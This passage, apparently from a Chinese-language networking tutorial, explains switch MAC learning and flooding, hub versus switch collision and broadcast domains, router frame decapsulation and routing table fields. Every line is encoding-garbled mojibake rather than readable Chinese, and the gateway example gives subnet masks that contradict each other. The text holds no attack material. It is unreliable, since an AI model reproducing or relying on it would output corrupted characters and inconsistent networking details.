è¾“ä¿¡å·åˆ°æŒ‡å®šçš„ç«¯å£ï¼Œå¦‚æœåœ¨Macåœ°å€è¡¨ä¸­æŸ¥ä¸åˆ°æ€ä¹ˆåŠï¼Ÿé‚£ä¹ˆäº¤æ¢æœºå°±ä¼šå°†ä¿¡å·è½¬å‘åˆ°é™¤äº†æºç«¯å£ä¹‹å¤–çš„å…¶ä»–æ‰€æœ‰ç«¯å£ä¸Šï¼Œæ­¤æ—¶å°±ç±»ä¼¼äºé›†çº¿å™¨çš„å·¥ä½œåŸç†ï¼Œè¿™ä¹Ÿæ˜¯äº¤æ¢å™¨æ¯”é›†çº¿å™¨é«˜æ•ˆçš„ä¸€ç‚¹ã€‚</p><h3 id="åŸç†-1">åŸç†</h3><p>äº¤æ¢æœºæ˜¯é“¾è·¯å±‚è®¾å¤‡ï¼Œå…¶åŸºæœ¬å·¥ä½œåŸç†ï¼š</p><ol type="1"><li><p>å­¦ä¹ ï¼Œæ ¹æ®æ”¶åˆ°çš„æ•°æ®å¸§ä¸­çš„æº MACåœ°å€å»ºç«‹è¯¥åœ°å€åŒäº¤æ¢æœºç«¯å£çš„æ˜ å°„ï¼Œå†™å…¥ MAC åœ°å€è¡¨ï¼ˆMACåœ°å€è¡¨è®°å½•äº†ç½‘ç»œä¸­æ‰€æœ‰ MAC åœ°å€ä¸è¯¥äº¤æ¢æœºå„ç«¯å£çš„å¯¹åº”å…³ç³»ï¼‰</p></li><li><p>ç›´æ¥è½¬å‘ï¼Œå¦‚æœæ•°æ®å¸§ä¸­çš„ç›®çš„ MAC åœ°å€åœ¨å»ºç«‹å¥½çš„ MACåœ°å€è¡¨ä¸­ï¼Œäº¤æ¢æœºä¾¿æ ¹æ®æ ¹æ®è¯¥åœ°å€åœ¨è¡¨ä¸­å¯¹åº”çš„ç«¯å£è¿›è¡Œè½¬å‘ã€‚</p></li><li><p>æ³›æ´ªï¼ˆfloodï¼‰ï¼Œå¦‚æœæ•°æ®å¸§ä¸­çš„ç›®çš„ MAC åœ°å€ä¸åœ¨ MACåœ°å€è¡¨ä¸­ï¼Œåˆ™å‘æ‰€æœ‰ç«¯å£è½¬å‘ï¼ˆé™¤è¿™ä¸ªæ•°æ®å¸§çš„å…¥å£ï¼‰ï¼Œç­‰åˆ°ç›¸åº”çš„ä¸»æœºå•æ’­å›å¤ä¹‹åï¼Œäº¤æ¢æœºè®°ä¸‹å›åº”æ•°æ®å¸§çš„æºMAC åœ°å€ä¸å¯¹åº”æ¥å£ï¼Œä»¥æ–¹ä¾¿ä¸‹æ¬¡è½¬å‘ã€‚ï¼ˆé€šè¿‡ ARP åè®®ï¼‰</p><p>æ³¨ï¼šARPï¼ˆå…¨ç§° Address ResolutionProtocol)ï¼Œç½‘ç»œå±‚çš„åè®®ï¼Œæ ¹æ®ç›®çš„ä¸»æœºçš„ IP åœ°å€ï¼Œè·å¾—å…¶ MACåœ°å€ã€‚</p></li><li><p>æ›´æ–°ï¼Œäº¤æ¢æœºå†…éƒ¨çš„ MAC åœ°å€è¡¨åªæœ‰ 300Sçš„å­˜åœ¨æ—¶é—´ï¼Œå®šæ—¶äº”åˆ†é’Ÿä¼šæ›´æ–°ä¸€æ¬¡</p></li></ol><h3 id="ç‰¹æ€§-1">ç‰¹æ€§</h3><h4 id="ç‹¬å å¸¦å®½">ç‹¬å å¸¦å®½</h4><p>äº¤æ¢æœºèƒ½åŒæ—¶è¿é€šè®¸å¤šå¯¹çš„ç«¯å£ï¼Œå¹¶åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ ¹æ® MACåœ°å€è¡¨è¿›è¡Œä¸€å¯¹ä¸€ç²¾å‡†çš„è½¬å‘ï¼Œè¿™æ ·å…¶ä»–ç«¯å£å°±ä¸ä¼šè¢«çŸ¥é“ä»–ä»¬æ­£åœ¨è½¬å‘æ•°æ®ã€‚</p><p>è¿™é‡Œä¸é›†çº¿å™¨æ¯”è¾ƒä¸€ä¸‹æ¯”è¾ƒå¥½ç†è§£ã€‚</p><p>ä¸€ä¸ª 8 å£ hubï¼Œå½“ç«¯å£ 1 ä¸Šçš„æœºå™¨ A è¦ç»™ç«¯å£ 8 ä¸Šçš„æœºå™¨ B å‘æ•°æ®æ—¶</p><p>åœ¨é›†çº¿å™¨ä¸Šæ•°æ®æ˜¯è¿™æ ·è·‘çš„ï¼š</p><ol type="1"><li>é¦–å…ˆ A åœ¨ç«¯å£ 1 ä¸Šä¾¦å¬ hub ä¸Šæœ‰æ²¡æœ‰æ•°æ®åœ¨ä¼ è¾“ï¼Œå¦‚æœæ²¡æœ‰ï¼Œç«¯å£ 1å°±è·³å‡ºæ¥å‘ hub ä¸Šå–Šï¼šâ€œæˆ‘æœ‰æ•°æ®åŒ…è¦ç»™ç«¯å£ 8ï¼Œè¯·ç«¯å£ 8 å¬åˆ°åå›è¯â€</li><li>ç„¶åè¿™ä¸ªæ•°æ®è¢«ä»¥å¹¿æ’­çš„æ–¹å¼å‘é€åˆ° hub ä¸Šçš„å…¶ä½™ 7ä¸ªå£ä¸Šï¼Œæ¯ç«¯å£éƒ½ä¼šæ¥åˆ°è¿™æ ·çš„æ•°æ®åŒ…ï¼Œç„¶åç«¯å£ 2 ~ 7 ä¼šå‘ä¸€åˆ™æ¶ˆæ¯ç»™ç«¯å£1ï¼šâ€œæˆ‘ä¸æ˜¯ç«¯å£ 8ï¼Œè¯·ä½ é‡Šæ”¾å¸¦å®½èµ„æºâ€</li><li>ä¸æ­¤åŒæ—¶ç«¯å£ 8 ä¼šå‘æ¶ˆæ¯ç»™ç«¯å£ 1ï¼šâ€œæˆ‘æ˜¯ç«¯å£ 8ï¼Œä½ åœ¨æ‰¾æˆ‘å—ï¼Ÿâ€ç«¯å£ 1æ”¶åˆ°ä¸Šè¿°æ¶ˆæ¯åï¼Œä¼šå’Œç«¯å£ 8è¿›è¡Œç¡®è®¤ï¼Œç„¶åä»–ä»¬å»ºç«‹ä¼ è¾“é“¾æ¥ï¼Œå®Œæˆæ•°æ®è½¬å‘ã€‚</li><li>å¦‚æœç«¯å£ 1 åœ¨å‘é€å¯»æ‰¾ç«¯å£ 8çš„æ¶ˆæ¯åï¼Œæ²¡æœ‰å¾—åˆ°ç›¸åº”ï¼Œé‚£å¥¹è¿˜ä¼šæ¥ç€å¹¿æ’­è¿™ä¸ªæ¶ˆæ¯ï¼Œç›´åˆ°æ”¶åˆ°ç«¯å£ 8çš„å›ç­”ã€‚ç­‰ç«¯å£ 1 å’Œç«¯å£ 8 å®Œæˆæ•°æ®è½¬å‘åï¼Œå‡è®¾ä»–ä»¬è¿˜è¦è¿›è¡Œé€šè®¯ï¼Œé‚£ä¹ˆ hubä¸Šè¿˜ä¼šé‡å¤ä»¥ä¸Šçš„è¿‡ç¨‹ã€‚</li></ol><p>è€Œäº¤æ¢æœºåˆ™æ˜¯è¿™æ ·ï¼š</p><ul><li><p>å¦‚æœ MAC è¡¨ä¸Šæœ‰ç›®çš„ MACï¼ˆå³ï¼šæœºå™¨ Bï¼‰ å¯¹åº” MACè¡¨é¡¹ï¼Œé‚£ä¹ˆäº¤æ¢æœºç›´æ¥æŸ¥è¡¨ï¼Œç„¶ååªè½¬å‘åˆ°ç«¯å£ 8</p></li><li><p>å¦‚æœ MACè¡¨ä¸Šæ²¡æœ‰å¯¹åº”è¡¨é¡¹ï¼Œåˆ™å‘æ‰€æœ‰ç«¯å£ï¼ˆé™¤äº†å¸§çš„è¿›å…¥ç«¯å£ï¼‰å¹¿æ’­ã€‚æ›´è¿›ä¸€æ­¥ï¼Œå¦‚æœç›®æ ‡å’Œæºåœ¨åŒä¸€ç«¯å£ï¼Œé‚£ä¹ˆäº¤æ¢æœºåˆ™ä¸åšä»»ä½•äº‹ï¼Œç®€å•çš„ä¸¢æ‰è¿™ä¸ªå¸§è€Œå·²ã€‚</p></li></ul><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œäº¤æ¢æœºçš„å·¥ä½œæ–¹å¼ï¼Œå¾ˆå¥½åœ°éš”ç¦»äº†å†²çªåŸŸï¼ŒåŒä¸€ç«¯å£çš„è®¾å¤‡ä¹‹é—´çš„é€šä¿¡å¹²æ‰°ä¸åˆ°å¦ä¸€ç«¯å£çš„è®¾å¤‡ä¹‹é—´çš„é€šä¿¡ï¼Œå› ä¸ºå®ƒæ— æ³•ç©¿é€äº¤æ¢æœºã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯ä¸€å¯¹ç›¸äº’é€šä¿¡çš„ä¸»æœºéƒ½èƒ½åƒç‹¬å é€šä¿¡åª’ä½“é‚£æ ·ï¼Œè¿›è¡Œæ— å†²çªåœ°ä¼ è¾“æ•°æ®ã€‚æ­¤å¤–ï¼Œäº¤æ¢æœºæ˜¯é€šè¿‡è‡ªå­¦ä¹ å­¦ä¹ åˆ°ç«¯å£å’Œç‰©ç†åœ°å€çš„æ˜ å°„çš„ï¼Œå¹¶ä¸” ARPåè®®ä½¿ç”¨çš„å°±æ˜¯å¹¿æ’­ï¼Œæ‰€ä»¥äº¤æ¢æœºç»å¯¹ä¸èƒ½å±è”½å¹¿æ’­ã€‚</p><h4 id="å…¨åŒå·¥">å…¨åŒå·¥</h4><p>å…¨åŒå·¥æ˜¯æ”¶å‘æ•°æ®ç‹¬ç«‹ï¼Œäº¤æ¢æœºå†…éƒ¨çš„æ„é€ ä¹Ÿæ˜¯æ”¶å‘ç‹¬ç«‹çš„ï¼Œè½¬å‘èŠ¯ç‰‡ã€phyèŠ¯ç‰‡éƒ½æ˜¯ä¸¤ä¸ªæ–¹å‘çš„ï¼Œæ‰€ä»¥å¯ä»¥å®ç°å…¨åŒå·¥ï¼›å†åŠ ä¸Šç›®å‰ç»å¤§å¤šæ•°æ™®é€šäº¤æ¢æœºéƒ½æ˜¯å­˜å‚¨è½¬å‘ï¼Œæ”¶åˆ°çš„æŠ¥æ–‡å…ˆå­˜å‚¨ï¼Œå†æŸ¥è¡¨è½¬å‘ï¼Œå¤šä¸ªå…¥å£åˆ°åŒä¸€ä¸ªå‡ºå£çš„æŠ¥æ–‡å­˜åœ¨å…ˆåé¡ºåºï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºç°hub çš„å†²çªæƒ…å†µäº†ã€‚</p><h3 id="å¹¿æ’­åŸŸ">å¹¿æ’­åŸŸ</h3><ul><li>å¹¿æ’­æ˜¯ä¸€ç§ä¿¡æ¯çš„ä¼ æ’­æ–¹å¼ï¼ŒæŒ‡ç½‘ç»œä¸­çš„æŸä¸€è®¾å¤‡åŒæ—¶å‘ç½‘ç»œä¸­æ‰€æœ‰çš„å…¶å®ƒè®¾å¤‡å‘é€æ•°æ®ï¼Œè¿™ä¸ªæ•°æ®æ‰€èƒ½å¹¿æ’­åˆ°çš„èŒƒå›´å³ä¸ºå¹¿æ’­åŸŸ(BroadcastDomain)ã€‚</li><li>åœ¨ä¼ è¾“ä¸­å½“ä¸çŸ¥é“ç›®çš„ MACåœ°å€æ—¶ï¼Œéœ€è¦åœ¨ç½‘æ®µå†…å¹¿æ’­å½“å‰å­ç½‘ä¸‹æ‰€æœ‰çš„èŠ‚ç‚¹ï¼Œç›¸åº”çš„å¹¿æ’­æŠ¥æ–‡ä»¥åŠç›®çš„ MACæŸ¥æ‰¾å¤±è´¥æŠ¥æ–‡ä¼šå‘æ‰€æœ‰ç«¯å£è½¬å‘ï¼Œå› æ­¤ä¼šæ¶ˆè€—å¤§é‡çš„ç½‘ç»œå¸¦å®½ã€‚è€ŒäºŒå±‚äº¤æ¢æœºåªèƒ½éš”ç¦»å†²çªåŸŸï¼Œä¸èƒ½éš”ç¦»å¹¿æ’­åŸŸã€‚</li><li>å†²çªåŸŸæ˜¯åŸºäºç¬¬ä¸€å±‚ï¼ˆç‰©ç†å±‚ï¼‰ å¹¿æ’­åŸŸæ˜¯åŸºäºç¬¬äºŒå±‚ï¼ˆé“¾è·¯å±‚ï¼‰</li></ul><p><strong>äº¤æ¢æœºèƒ½éš”ç¦»å†²çªåŸŸï¼Œä¸éš”ç¦»å¹¿æ’­åŸŸï¼Œé›†çº¿å™¨çš„æ‰€æœ‰ç«¯å£åœ¨åŒä¸€ä¸ªå†²çªåŸŸä¸‹</strong></p><h2 id="è·¯ç”±å™¨">è·¯ç”±å™¨</h2><p>è·¯ç”±å™¨å¤„äºç½‘ç»œå±‚ï¼ˆå¯¹æˆ‘ä»¬æ¥è¯´ï¼Œåº”è¯¥ç®—æ˜¯è¦é‡ç‚¹æŒæ¡çš„ï¼‰ï¼Œå®ƒæ ¹æ®ç›®çš„ IPä»¥åŠè·¯ç”±è¡¨è¿›è¡Œè½¬å‘å’Œé€‰è·¯</p><h3 id="ä½œç”¨">ä½œç”¨</h3><ol type="1"><li><p>å¼‚ç§ç½‘ç»œäº’è¿ï¼šæ¯”å¦‚å…·æœ‰å¼‚ç§å­ç½‘åè®®çš„ç½‘ç»œäº’è¿</p></li><li><p>å­ç½‘åè®®è½¬æ¢ï¼šä¸åŒå­ç½‘é—´åŒ…æ‹¬å±€åŸŸç½‘å’Œå¹¿åŸŸç½‘ä¹‹é—´çš„åè®®è½¬æ¢</p></li><li><p>è·¯ç”±ï¼šä¹Ÿå°±æ˜¯å¯»è·¯</p></li><li><p>é€Ÿç‡é€‚é…ï¼šåˆ©ç”¨è‡ªå·±çš„ç¼“å­˜å’Œæµæ§åè®®è¿›è¡Œé€‚é…</p></li><li><p>éš”ç¦»ç½‘ç»œï¼šé˜²æ­¢å¹¿æ’­é£æš´ï¼Œè¿˜èƒ½å®ç°é˜²ç«å¢™</p></li><li><p>æŠ¥æ–‡åˆ†ç‰‡å’Œé‡ç»„ï¼šè¶…è¿‡æ¥å£çš„ MTUæŠ¥æ–‡ä¼šè¢«åˆ†ç‰‡ï¼Œåˆ°è¾¾ç›®çš„åœ°ä¹‹åçš„æŠ¥æ–‡ä¼šè¢«é‡ç»„</p></li><li><p>å¤‡ä»½ã€æµé‡æ§åˆ¶ï¼šä¸»å¤‡çº¿è·¯çš„åˆ‡æ¢å’Œå¤æ‚çš„æµé‡æ§åˆ¶</p></li></ol><h3 id="åŸç†-2">åŸç†</h3><p>è·¯ç”±å™¨å·¥ä½œåœ¨ OSIä¸ƒå±‚åè®®ä¸­çš„ç¬¬ä¸‰å±‚ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œå±‚ã€‚å…¶ä¸»è¦ä»»åŠ¡æ˜¯æ¥æ”¶æ¥æºäºä¸€ä¸ªç½‘ç»œæ¥å£çš„æ•°æ®åŒ…ï¼Œæ ¹æ®è¿™ä¸ªæ•°æ®åŒ…ä¸­æ‰€å«ç›®çš„IPåœ°å€ï¼Œå†³å®šè½¬å‘åˆ°çš„ä¸‹ä¸€ä¸ªç›®çš„åœ°å€ã€‚è·¯ç”±å™¨ä¸­æ—¶åˆ»ç»´æŒç€ä¸€å¼ è·¯ç”±è¡¨ï¼Œæ‰€æœ‰çš„æ•°æ®åŒ…çš„å‘é€å’Œè½¬å‘éƒ½é€šè¿‡æŸ¥æ‰¾è·¯ç”±è¡¨æ¥å®ç°çš„ã€‚è¿™ä¸ªè·¯ç”±è¡¨å¯ä»¥é™æ€é…ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åŠ¨æ€è·¯ç”±åè®®äº§ç”Ÿã€‚</p><h4 id="å¸§çš„è§£å°è£…ä¸å°è£…">å¸§çš„è§£å°è£…ä¸å°è£…</h4><p>ä»è·¯ç”±å™¨ä¸€ä¸ªæ¥å£æ¥æ”¶,ç„¶åé€‰æ‹©åˆé€‚ç«¯å£è½¬å‘,å…¶é—´åšå¸§çš„è§£å°è£…ä¸å°è£…,å¹¶å¯¹åŒ…åšç›¸åº”å¤„ç†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/package.jpg" /></p><ol type="1"><li><p>è·¯ç”±å™¨ç‰©ç†å±‚ä»è·¯ç”±å™¨çš„ä¸€ä¸ªç«¯å£æ”¶åˆ°ä¸€ä¸ªæŠ¥æ–‡ï¼Œä¸Šé€åˆ°æ•°æ®é“¾è·¯å±‚ã€‚</p></li><li><p>æ•°æ®é“¾è·¯å±‚å¯¹åˆ°è¾¾çš„æ•°æ®å¸§è¿›è¡Œ CRCæ ¡éªŒå¹¶æ£€æŸ¥å…¶ç›®çš„æ•°æ®é“¾è·¯å±‚åœ°å€ï¼ˆå³ï¼šMACåœ°å€ï¼‰æ˜¯å¦ä¸æœ¬ç«¯å£ç¬¦åˆ.ä¸ç¬¦åˆåˆ™ä¸¢å¼ƒï¼Œç¬¦åˆåˆ™å°†å»æ‰é“¾è·¯å±‚å°è£…ï¼ˆå¸§çš„å°è£…ï¼‰ï¼Œæ ¹æ®æŠ¥æ–‡çš„åè®®åŸŸä¸Šé€åˆ°ç½‘ç»œå±‚</p></li><li><p>ç½‘ç»œå±‚é¦–å…ˆçœ‹æŠ¥æ–‡æ˜¯å¦æ˜¯é€ç»™æœ¬æœºçš„ï¼Œè‹¥æ˜¯ï¼Œå»æ‰ç½‘ç»œå±‚å°è£…ï¼Œé€ç»™ä¸Šå±‚ã€‚è‹¥ä¸æ˜¯ï¼Œåˆ™æ ¹æ®æŠ¥æ–‡çš„ç›®çš„IP åœ°å€æŸ¥æ‰¾è·¯ç”±è¡¨ï¼Œ</p><ol type="1"><li><p>è‹¥æ‰¾ä¸åˆ°å¯¹åº”è·¯ç”±è¡¨é¡¹ï¼ŒæŠ¥æ–‡ä¸¢å¼ƒã€‚</p></li><li><p>è‹¥æ‰¾åˆ°å¯¹åº”è·¯ç”±è¡¨é¡¹ï¼Œåˆ™æ ¹æ®è¡¨é¡¹å†³å®šè½¬å‘æ¥å£ä¸ä¸‹ä¸€è·³åœ°å€ã€‚è·å¾—äº†è½¬å‘æ¥å£ä¸ä¸‹ä¸€è·³åœ°å€ä¿¡æ¯åè·¯ç”±å™¨å°†æŸ¥çœ‹ç¼“å­˜ä¸­æ˜¯å¦å·²ç»æœ‰äº†åœ¨å¤–å‡ºæ¥å£ä¸Šè¿›è¡Œæ•°æ®é“¾è·¯å±‚å°è£…æ‰€éœ€çš„ä¿¡æ¯ã€‚å¦‚æœæ²¡æœ‰è¿™äº›ä¿¡æ¯ï¼Œè·¯ç”±å™¨å°†é€šè¿‡é€‚å½“çš„è¿›ç¨‹è·å¾—è¿™äº›ä¿¡æ¯</p><ol type="1"><li>å¤–å‡ºæ¥å£å¦‚æœæ˜¯ä»¥å¤ªç½‘,åˆ™å°†é€šè¿‡ ARP åè®®è·å¾—ä¸‹ä¸€è·³ IP åœ°å€æ‰€å¯¹åº”çš„ MACåœ°å€</li><li>å¤–å‡ºæ¥å£å¦‚æœæ˜¯å¹¿åŸŸç½‘æ¥å£,åˆ™å°†é€šè¿‡æ‰‹å·¥é…ç½®æˆ–è‡ªåŠ¨å®ç°çš„æ˜ å°„è¿‡ç¨‹è·å¾—ç›¸åº”çš„2 å±‚åœ°å€ä¿¡æ¯</li></ol><p>ç„¶ååšæ–°çš„æ•°æ®é“¾è·¯å±‚å°è£…,å¹¶ä¾æ®å¤–å‡ºæ¥å£ä¸Šæ‰€åšçš„ QOSç­–ç•¥å…¥ç›¸åº”çš„é˜Ÿåˆ—,ç­‰å¾…ç«¯å£ç©ºé—²è¿›è¡Œæ•°æ®è½¬å‘.</p></li></ol></li></ol><p>å…¶ä¸­è·¯ç”±è¡¨æœ‰äº”ä¸ªè¡¨é¡¹</p><p>1ã€ç½‘ç»œåœ°å€ï¼ˆ<em>NetworkDestination</em>ï¼‰ã€ç½‘ç»œæ©ç ï¼ˆ<em>Netmask</em>ï¼‰ï¼šç½‘ç»œåœ°å€å’Œç½‘ç»œæ©ç ç›¸ä¸çš„ç»“æœä¾¿æ˜¯å­ç½‘åœ°å€ã€‚</p><p>2ã€ç½‘å…³ï¼ˆ<em>Gatewayï¼Œåˆç§°ä¸º</em>ä¸‹ä¸€è·³æœåŠ¡å™¨ï¼‰ï¼šåœ¨å‘é€ IPæ•°æ®åŒ…æ—¶ï¼Œç½‘å…³å®šä¹‰äº†é’ˆå¯¹ç‰¹å®šçš„ç½‘ç»œç›®çš„åœ°å€ï¼Œæ•°æ®åŒ…å‘é€åˆ°çš„ä¸‹ä¸€è·³æœåŠ¡å™¨ã€‚å¦‚æœæ˜¯æœ¬åœ°è®¡ç®—æœºç›´æ¥è¿æ¥åˆ°çš„ç½‘ç»œï¼Œç½‘å…³é€šå¸¸æ˜¯æœ¬åœ°è®¡ç®—æœºå¯¹åº”çš„ç½‘ç»œæ¥å£ï¼Œä½†æ˜¯æ­¤æ—¶æ¥å£å¿…é¡»å’Œç½‘å…³ä¸€è‡´ï¼›å¦‚æœæ˜¯è¿œç¨‹ç½‘ç»œæˆ–é»˜è®¤è·¯ç”±ï¼Œç½‘å…³é€šå¸¸æ˜¯æœ¬åœ°è®¡ç®—æœºæ‰€è¿æ¥åˆ°çš„ç½‘ç»œä¸Šçš„æŸä¸ªæœåŠ¡å™¨æˆ–è·¯ç”±å™¨ã€‚</p><blockquote><p>ç™¾åº¦ç™¾ç§‘ï¼šç½‘å…³å°±æ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œçš„â€œå…³å£â€ã€‚ä¹Ÿå°±æ˜¯ç½‘ç»œå…³å¡ã€‚</p></blockquote><p>ç½‘å…³æ—¢å¯ä»¥ç”¨äºå¹¿åŸŸç½‘äº’è¿ï¼Œä¹Ÿå¯ä»¥ç”¨äºå±€åŸŸç½‘äº’è¿</p><p>ç½‘å…³å®è´¨ä¸Šæ˜¯ä¸€ä¸ªç½‘ç»œé€šå‘å…¶ä»–ç½‘ç»œçš„ IP åœ°å€ã€‚æ¯”å¦‚æœ‰ç½‘ç»œ A å’Œç½‘ç»œBï¼Œç½‘ç»œ A çš„ IP åœ°å€èŒƒå›´ä¸ºâ€œ192.168.1.1~192. 168.1.254â€ï¼Œå­ç½‘æ©ç ä¸º255.0.0.0ï¼›ç½‘ç»œ B çš„ IP åœ°å€èŒƒå›´ä¸ºâ€œ192.168.2~192.168.2.254â€ï¼Œå­ç½‘æ©ç ä¸º255.255.0.0ã€‚åœ¨æ²¡æœ‰è·¯ç”±å™¨çš„æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªç½‘ç»œä¹‹é—´æ˜¯ä¸èƒ½è¿›è¡Œ TCP/IPé€šä¿¡çš„ï¼Œå³ä½¿æ˜¯ä¸¤ä¸ªç½‘ç»œè¿æ¥åœ¨åŒä¸€å°äº¤æ¢æœºï¼ˆæˆ–é›†çº¿å™¨ï¼‰ä¸Šï¼ŒTCP/IPåè®®ä¹Ÿä¼šæ ¹æ®å­ç½‘æ©ç ï¼ˆ255.255.255.0ï¼‰åˆ¤å®šä¸¤ä¸ªç½‘ç»œä¸­çš„ä¸»æœºå¤„åœ¨ä¸åŒçš„ç½‘ç»œé‡Œã€‚è€Œè¦å®ç°è¿™ä¸¤ä¸ªç½‘ç»œä¹‹é—´çš„é€šä¿¡ï¼Œåˆ™å¿…é¡»é€šè¿‡ç½‘å…³ã€‚å¦‚æœç½‘ç»œAä¸­çš„ä¸»æœºå‘ç°æ•°æ®åŒ…çš„ç›®çš„ä¸»æœºä¸åœ¨æœ¬åœ°ç½‘ç»œä¸­ï¼Œå°±æŠŠæ•°æ®åŒ…è½¬å‘ç»™å®ƒè‡ªå·±çš„ç½‘å…³ï¼Œå†ç”±ç½‘å…³è½¬å‘ç»™ç½‘ç»œB çš„ç½‘å…³ï¼Œç½‘ç»œ B çš„ç½‘å…³å†è½¬å‘ç»™ç½‘ç»œ B çš„æŸä¸ªä¸»æœºï¼ˆå¦‚é™„å›¾æ‰€ç¤ºï¼‰ã€‚ç½‘ç»œ Aå‘ç½‘ç»œ B è½¬å‘æ•°æ®åŒ…çš„è¿‡ç¨‹ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œåªæœ‰è®¾ç½®å¥½ç½‘å…³çš„ IP åœ°å€ï¼ŒTCP/IPåè®®æ‰èƒ½å®ç°ä¸åŒç½‘ç»œä¹‹é—´çš„ç›¸äº’é€šä¿¡ã€‚é‚£ä¹ˆè¿™ä¸ª IP åœ°å€æ˜¯å“ªå°æœºå™¨çš„ IPåœ°å€å‘¢ï¼Ÿç½‘å…³çš„ IP åœ°å€æ˜¯å…·æœ‰è·¯ç”±åŠŸèƒ½çš„è®¾å¤‡çš„ IPåœ°å€ï¼Œå…·æœ‰è·¯ç”±åŠŸèƒ½çš„è®¾å¤‡æœ‰è·¯ç”±å™¨ã€å¯ç”¨äº†è·¯ç”±åè®®çš„æœåŠ¡å™¨ï¼ˆå®è´¨ä¸Šç›¸å½“äºä¸€å°è·¯ç”±å™¨ï¼‰ã€ä»£ç†æœåŠ¡å™¨ï¼ˆä¹Ÿç›¸å½“äºä¸€å°è·¯ç”±å™¨ï¼‰ã€‚</p><p>3ã€æ¥å£ï¼ˆInterfaceï¼‰ï¼šæ¥å£å®šä¹‰äº†é’ˆå¯¹ç‰¹å®šçš„ç½‘ç»œç›®çš„åœ°å€ï¼Œæœ¬åœ°è®¡ç®—æœºç”¨äºå‘é€æ•°æ®åŒ…çš„ç½‘ç»œæ¥å£ã€‚ç½‘å…³å¿…é¡»ä½äºå’Œæ¥å£ç›¸åŒçš„å­ç½‘ï¼ˆé»˜è®¤ç½‘å…³é™¤å¤–ï¼‰ï¼Œå¦åˆ™é€ æˆåœ¨ä½¿ç”¨æ­¤è·¯ç”±é¡¹æ—¶éœ€è°ƒç”¨å…¶ä»–è·¯ç”±é¡¹ï¼Œä»è€Œå¯èƒ½ä¼šå¯¼è‡´è·¯ç”±æ­»é”ã€‚</p><p>4ã€è·ƒç‚¹æ•°ï¼ˆMetricï¼‰ï¼šè·ƒç‚¹æ•°ç”¨äºæŒ‡å‡ºè·¯ç”±çš„æˆæœ¬ï¼Œé€šå¸¸æƒ…å†µä¸‹ä»£è¡¨åˆ°è¾¾ç›®æ ‡åœ°å€æ‰€éœ€è¦ç»è¿‡çš„è·ƒç‚¹æ•°é‡ï¼Œä¸€ä¸ªè·ƒç‚¹ä»£è¡¨ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ã€‚è·ƒç‚¹æ•°è¶Šä½ï¼Œä»£è¡¨è·¯ç”±æˆæœ¬è¶Šä½ï¼›è·ƒç‚¹æ•°è¶Šé«˜ï¼Œä»£è¡¨è·¯ç”±æˆæœ¬è¶Šé«˜ã€‚å½“å…·æœ‰å¤šæ¡åˆ°è¾¾ç›¸åŒç›®çš„ç½‘ç»œçš„è·¯ç”±é¡¹æ—¶ï¼ŒTCP/IPä¼šé€‰æ‹©å…·æœ‰æ›´ä½è·ƒç‚¹æ•°çš„è·¯ç”±é¡¹ã€‚</p><p>â€‹è·¯ç”±å’Œäº¤æ¢ä¹‹é—´çš„ä¸»è¦åŒºåˆ«å°±æ˜¯äº¤æ¢å‘ç”Ÿåœ¨æ•°æ®é“¾è·¯å±‚ï¼Œè€Œè·¯ç”±å‘ç”Ÿåœ¨ç¬¬ä¸‰å±‚ï¼Œå³ç½‘ç»œå±‚ã€‚è¿™ä¸€åŒºåˆ«å†³å®šäº†è·¯ç”±å’Œäº¤æ¢åœ¨ç§»åŠ¨ä¿¡æ¯çš„è¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨ä¸åŒçš„æ§åˆ¶ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸¤è€…å®ç°å„è‡ªåŠŸèƒ½çš„æ–¹å¼æ˜¯ä¸åŒçš„ã€‚</p><h3 id="è·¯ç”±é€‰æ‹©">è·¯ç”±é€‰æ‹©</h3><p>åˆ†ä¸ºåŸŸå†…é€‰è·¯å’ŒåŸŸé—´é€‰è·¯ï¼Œå‡†å¤‡å†å¼€ä¸€ç¯‡æ–‡ç« æ¥è®²ã€‚</p><p>è·¯ç”±å™¨å·¥ä½œè¿‡ç¨‹æ€»ç»“ï¼šå¯¹äºä¸€ä¸ªç‰¹å®šçš„è·¯ç”±åè®®ï¼Œå¯ä»¥å‘ç°åˆ°è¾¾ç›®çš„ç½‘ç»œçš„æ‰€æœ‰è·¯å¾„ã€‚åŸŸå†…é€‰è·¯æ˜¯æ ¹æ®åŸŸå†…é€‰è·¯ç®—æ³•èµ‹äºˆæ¯ä¸€æ¡è·¯å¾„metric å€¼,æ¯”è¾ƒ metric å€¼,é€‰æ‹© metricå€¼æœ€å°çš„è·¯å¾„ä¸ºæœ€ä½³è·¯å¾„è¿›è¡Œæ•°æ®çš„è½¬å‘ã€‚ISP ä¹‹é—´çš„è·¯ç”±é€‰æ‹© BGPï¼Œè·¯ç”±é€‰æ‹©ç®—æ³•ï¼ŒæŒ‰ç…§ä»¥ä¸‹ä¼˜å…ˆæ¬¡åºï¼šæœ¬åœ°åå¥½ -&gt; æœ€çŸ­ AS-PATH -&gt;çƒ­åœŸè±†è·¯ç”±é€‰æ‹© 